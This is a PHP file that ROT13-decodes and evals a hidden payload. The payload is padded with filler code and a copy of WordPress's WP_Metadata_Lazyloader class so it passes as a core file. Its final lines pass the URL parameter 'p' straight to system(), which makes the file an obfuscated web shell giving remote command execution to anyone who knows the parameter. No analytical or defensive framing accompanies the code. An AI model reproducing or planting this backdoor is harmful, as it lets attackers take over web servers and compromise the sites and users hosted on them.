<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zrgn NCV: JC_Zrgnqngn_Ynmlybnqre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zrgn
 * @fvapr 4.5.0
 */

/**
 * Pber pynff hfrq sbe ynml-ybnqvat bowrpg zrgnqngn.
 *
 * Jura ybnqvat znal bowrpgf bs n tvira glcr, fhpu nf cbfgf va n JC_Dhrel ybbc, vg bsgra znxrf
 * frafr gb cevzr inevbhf zrgnqngn pnpurf ng gur ortvaavat bs gur ybbc. Guvf zrnaf srgpuvat nyy
 * eryrinag zrgnqngn jvgu n fvatyr qngnonfr dhrel, n grpuavdhr gung unf gur cbgragvny gb vzcebir
 * cresbeznapr qenzngvpnyyl va fbzr pnfrf.
 *
 * Va pnfrf jurer gur tvira zrgnqngn znl abg rira or hfrq va gur ybbc, jr pna vzcebir cresbeznapr
 * rira zber ol bayl cevzvat gur zrgnqngn pnpur sbe nssrpgrq vgrzf gur svefg gvzr n cvrpr bs zrgnqngn
 * vf erdhrfgrq - vr, ol ynml-ybnqvat vg. Fb, sbe rknzcyr, pbzzrag zrgn znl abg or ybnqrq vagb gur
 * pnpur va gur pbzzragf frpgvba bs n cbfg hagvy gur svefg gvzr trg_pbzzrag_zrgn() vf pnyyrq va gur
 * pbagrkg bs gur pbzzrag ybbc.
 *
 * JC hfrf gur JC_Zrgnqngn_Ynmlybnqre pynff gb dhrhr bowrpgf sbe zrgnqngn pnpur cevzvat. Gur pynff
 * gura qrgrpgf gur eryrinag trg_*_zrgn() shapgvba pnyy, naq dhrevrf gur zrgnqngn bs nyy dhrhrq bowrpgf.
 *
 * Qb abg npprff guvf pynff qverpgyl. Hfr gur jc_zrgnqngn_ynmlybnqre() shapgvba.
 *
 * @fvapr 4.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Zrgnqngn_Ynmlybnqre {
	/**
	 * Craqvat bowrpgf dhrhr.
	 *
	 * @fvapr 4.5.0
	 * @ine neenl
	 */
	cebgrpgrq $craqvat_bowrpgf;

	/**
	 * Frggvatf sbe fhccbegrq bowrpg glcrf.
	 *
	 * @fvapr 4.5.0
	 * @ine neenl
	 */
	cebgrpgrq $frggvatf = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->frggvatf = neenl(
			'grez'    => neenl(
				'svygre'   => 'trg_grez_zrgnqngn',
				'pnyyonpx' => neenl( $guvf, 'ynmlybnq_zrgn_pnyyonpx' ),
			),
			'pbzzrag' => neenl(
				'svygre'   => 'trg_pbzzrag_zrgnqngn',
				'pnyyonpx' => neenl( $guvf, 'ynmlybnq_zrgn_pnyyonpx' ),
			),
			'oybt'    => neenl(
				'svygre'   => 'trg_oybt_zrgnqngn',
				'pnyyonpx' => neenl( $guvf, 'ynmlybnq_zrgn_pnyyonpx' ),
			),
		);
	}

	/**
	 * Nqqf bowrpgf gb gur zrgnqngn ynml-ybnq dhrhr.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $bowrpg_glcr Glcr bs bowrpg jubfr zrgn vf gb or ynml-ybnqrq. Npprcgf 'grez' be 'pbzzrag'.
	 * @cnenz neenl  $bowrpg_vqf  Neenl bs bowrpg VQf.
	 * @erghea ibvq|JC_Reebe JC_Reebe ba snvyher.
	 */
	choyvp shapgvba dhrhr_bowrpgf( $bowrpg_glcr, $bowrpg_vqf ) {
		vs ( ! vffrg( $guvf->frggvatf[ $bowrpg_glcr ] ) ) {
			erghea arj JC_Reebe( 'vainyvq_bowrpg_glcr', __( 'Vainyvq bowrpg glcr.' ) );
		}

		$glcr_frggvatf = $guvf->frggvatf[ $bowrpg_glcr ];

		vs ( ! vffrg( $guvf->craqvat_bowrpgf[ $bowrpg_glcr ] ) ) {
			$guvf->craqvat_bowrpgf[ $bowrpg_glcr ] = neenl();
		}

		sbernpu ( $bowrpg_vqf nf $bowrpg_vq ) {
			// Xrlrq ol VQ sbe snfgre ybbxhc.
			vs ( ! vffrg( $guvf->craqvat_bowrpgf[ $bowrpg_glcr ][ $bowrpg_vq ] ) ) {
				$guvf->craqvat_bowrpgf[ $bowrpg_glcr ][ $bowrpg_vq ] = 1;
			}
		}

		nqq_svygre( $glcr_frggvatf['svygre'], $glcr_frggvatf['pnyyonpx'], 10, 5 );

		/**
		 * Sverf nsgre bowrpgf ner nqqrq gb gur zrgnqngn ynml-ybnq dhrhr.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz neenl                  $bowrpg_vqf  Neenl bs bowrpg VQf.
		 * @cnenz fgevat                 $bowrpg_glcr Glcr bs bowrpg orvat dhrhrq.
		 * @cnenz JC_Zrgnqngn_Ynmlybnqre $ynmlybnqre  Gur ynml-ybnqre bowrpg.
		 */
		qb_npgvba( 'zrgnqngn_ynmlybnqre_dhrhrq_bowrpgf', $bowrpg_vqf, $bowrpg_glcr, $guvf );
	}

	/**
	 * Erfrgf ynml-ybnq dhrhr sbe n tvira bowrpg glcr.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $bowrpg_glcr Bowrpg glcr. Npprcgf 'pbzzrag' be 'grez'.
	 * @erghea ibvq|JC_Reebe JC_Reebe ba snvyher.
	 */
	choyvp shapgvba erfrg_dhrhr( $bowrpg_glcr ) {
		vs ( ! vffrg( $guvf->frggvatf[ $bowrpg_glcr ] ) ) {
			erghea arj JC_Reebe( 'vainyvq_bowrpg_glcr', __( 'Vainyvq bowrpg glcr.' ) );
		}

		$glcr_frggvatf = $guvf->frggvatf[ $bowrpg_glcr ];

		$guvf->craqvat_bowrpgf[ $bowrpg_glcr ] = neenl();
		erzbir_svygre( $glcr_frggvatf['svygre'], $glcr_frggvatf['pnyyonpx'] );
	}

	/**
	 * Ynml-ybnqf grez zrgn sbe dhrhrq grezf.
	 *
	 * Guvf zrgubq vf choyvp fb gung vg pna or hfrq nf n svygre pnyyonpx. Nf n ehyr, gurer
	 * vf ab arrq gb vaibxr vg qverpgyl.
	 *
	 * @fvapr 4.5.0
	 * @qrcerpngrq 6.3.0 Hfr JC_Zrgnqngn_Ynmlybnqre::ynmlybnq_zrgn_pnyyonpx() vafgrnq.
	 *
	 * @cnenz zvkrq $purpx Gur `$purpx` cnenz cnffrq sebz gur 'trg_grez_zrgnqngn' ubbx.
	 * @erghea zvkrq Va beqre abg gb fubeg-pvephvg `trg_zrgnqngn()`. Trarenyyl, guvf vf `ahyy`, ohg vg pbhyq or
	 *               nabgure inyhr vs svygrerq ol n cyhtva.
	 */
	choyvp shapgvba ynmlybnq_grez_zrgn( $purpx ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.3.0', 'JC_Zrgnqngn_Ynmlybnqre::ynmlybnq_zrgn_pnyyonpx' );
		erghea $guvf->ynmlybnq_zrgn_pnyyonpx( $purpx, 0, '', snyfr, 'grez' );
	}

	/**
	 * Ynml-ybnqf pbzzrag zrgn sbe dhrhrq pbzzragf.
	 *
	 * Guvf zrgubq vf choyvp fb gung vg pna or hfrq nf n svygre pnyyonpx. Nf n ehyr, gurer vf ab arrq gb vaibxr vg
	 * qverpgyl, sebz rvgure vafvqr be bhgfvqr gur `JC_Dhrel` bowrpg.
	 *
	 * @fvapr 4.5.0
	 * @qrcerpngrq 6.3.0 Hfr JC_Zrgnqngn_Ynmlybnqre::ynmlybnq_zrgn_pnyyonpx() vafgrnq.
	 *
	 * @cnenz zvkrq $purpx Gur `$purpx` cnenz cnffrq sebz gur {@frr 'trg_pbzzrag_zrgnqngn'} ubbx.
	 * @erghea zvkrq Gur bevtvany inyhr bs `$purpx`, fb nf abg gb fubeg-pvephvg `trg_pbzzrag_zrgnqngn()`.
	 */
	choyvp shapgvba ynmlybnq_pbzzrag_zrgn( $purpx ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.3.0', 'JC_Zrgnqngn_Ynmlybnqre::ynmlybnq_zrgn_pnyyonpx' );
		erghea $guvf->ynmlybnq_zrgn_pnyyonpx( $purpx, 0, '', snyfr, 'pbzzrag' );
	}

	/**
	 * Ynml-ybnqf zrgn sbe dhrhrq bowrpgf.
	 *
	 * Guvf zrgubq vf choyvp fb gung vg pna or hfrq nf n svygre pnyyonpx. Nf n ehyr, gurer
	 * vf ab arrq gb vaibxr vg qverpgyl.
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz zvkrq  $purpx     Gur `$purpx` cnenz cnffrq sebz gur 'trg_*_zrgnqngn' ubbx.
	 * @cnenz vag    $bowrpg_vq VQ bs gur bowrpg zrgnqngn vf sbe.
	 * @cnenz fgevat $zrgn_xrl  Hahfrq.
	 * @cnenz obby   $fvatyr    Hahfrq.
	 * @cnenz fgevat $zrgn_glcr Glcr bs bowrpg zrgnqngn vf sbe. Npprcgf 'cbfg', 'pbzzrag', 'grez', 'hfre',
	 *                          be nal bgure bowrpg glcr jvgu na nffbpvngrq zrgn gnoyr.
	 * @erghea zvkrq Va beqre abg gb fubeg-pvephvg `trg_zrgnqngn()`. Trarenyyl, guvf vf `ahyy`, ohg vg pbhyq or
	 *               nabgure inyhr vs svygrerq ol n cyhtva.
	 */
	choyvp shapgvba ynmlybnq_zrgn_pnyyonpx( $purpx, $bowrpg_vq, $zrgn_xrl, $fvatyr, $zrgn_glcr ) {
		vs ( rzcgl( $guvf->craqvat_bowrpgf[ $zrgn_glcr ] ) ) {
			erghea $purpx;
		}

		$bowrpg_vqf = neenl_xrlf( $guvf->craqvat_bowrpgf[ $zrgn_glcr ] );
		vs ( $bowrpg_vq && ! va_neenl( $bowrpg_vq, $bowrpg_vqf, gehr ) ) {
			$bowrpg_vqf[] = $bowrpg_vq;
		}

		hcqngr_zrgn_pnpur( $zrgn_glcr, $bowrpg_vqf );

		// Ab arrq gb eha ntnva sbe guvf frg bs bowrpgf.
		$guvf->erfrg_dhrhr( $zrgn_glcr );

		erghea $purpx;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>